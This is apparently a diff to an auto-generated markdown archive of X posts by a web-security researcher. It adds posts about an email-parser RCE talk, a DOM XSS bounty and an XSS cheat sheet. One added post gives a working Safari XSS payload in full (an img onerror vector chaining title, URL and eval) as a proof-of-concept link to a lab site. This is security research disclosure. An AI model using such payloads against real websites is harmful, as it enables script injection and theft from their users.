@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 74
-- Conversations/threads: 62
-- Oldest post captured: 2025-12-06
+- Posts in this file: 78
+- Conversations/threads: 66
+- Oldest post captured: 2025-10-23
 - Newest post captured: 2026-11-09
 
 
@@ -1183,3 +1183,84 @@ Tags (automatic): CSP / CSPT
     **Media:**
     - media `3_1997150571254763521` (details not returned by the API)
     
+
+
+---
+
+## 2025-12-01 · Post · On Thursday I'm presenting "Splitting the email atom:exploiting parsers to bypass access controls" a
+
+
+Tags (automatic): RCE
+
+
+### Post — @garethheyes — 2025-12-01 11:13 UTC (2025-12-01 12:13 WAT)
+
+- URL: https://x.com/garethheyes/status/1995451164062601592
+- Metrics (at fetch): not returned
+
+> On Thursday I'm presenting "Splitting the email atom:exploiting parsers to bypass access controls" at NDC Manchester. Please join me if you want to find out how to turn an RFC compliant email address into RCE.
+>
+> https://portswigger.net/research/talks?talkId=34
+
+**Links in post:** https://portswigger.net/research/talks?talkId=34
+
+
+---
+
+## 2025-11-27 · Post · DOM Invader found DOM XSS on an Adobe sign in page and they finally decided not to award me a bounty
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-11-27 18:05 UTC (2025-11-27 19:05 WAT)
+
+- URL: https://x.com/garethheyes/status/1994105327168508113
+- Metrics (at fetch): not returned
+
+> DOM Invader found DOM XSS on an Adobe sign in page and they finally decided not to award me a bounty...7 years later 😂
+
+
+---
+
+## 2025-10-30 · Post · New Safari vector:
+
+
+Tags (automatic): XSS, Request smuggling / desync
+
+
+### Post — @garethheyes — 2025-10-30 12:48 UTC (2025-10-30 13:48 WAT)
+
+- URL: https://x.com/garethheyes/status/1983878620813914487
+- Metrics (at fetch): not returned
+
+> New Safari vector:
+>
+> Instead of using window name, I use document.URL to smuggle the payload and the title attribute to create the TypeError XSS.
+>
+> Hash:
+> #'-alert(1)//
+>
+> Poc:
+> https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%20title=a%22-%27%20onerror=%22xss=title%2bURL,top.onerror=eval,new%20xss%22%3E#'-alert(1)// [pic.x.com/mozvfatJjP]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G4gkL37WYAAV3sZ.jpg — alt text: "<img src title=a"-' onerror="xss=title+URL,top.onerror=eval,new xss">"
+
+**Links in post:** https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%20title=a%22-%27%20onerror=%22xss=title%2bURL,top.onerror=eval,new%20xss%22%3E#'-alert(1)//
+
+
+---
+
+## 2025-10-23 · Post · Currently updating the XSS cheat sheet.
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-10-23 12:32 UTC (2025-10-23 13:32 WAT)
+
+- URL: https://x.com/garethheyes/status/1981337911040651624
+- Metrics (at fetch): not returned
+
+> Currently updating the XSS cheat sheet.
